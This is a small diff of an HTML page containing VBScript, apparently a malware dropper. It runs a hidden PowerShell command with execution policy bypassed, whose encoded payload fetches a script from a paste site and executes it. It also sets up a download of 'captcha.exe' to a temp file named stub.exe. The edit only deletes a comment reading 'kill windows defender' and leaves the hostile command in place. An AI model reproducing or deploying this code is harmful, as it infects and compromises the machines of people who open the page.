@@ -2,7 +2,7 @@
 <script language="VBScript">
 Dim shell
 Set shell = CreateObject("WScript.Shell")
-shell.Run "powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA", 0 // kill windows defender
+shell.Run "powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA", 0
 
 downloadUrl = "https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/captcha.exe"
 localPath = shell.ExpandEnvironmentStrings("%temp%\stub.exe")
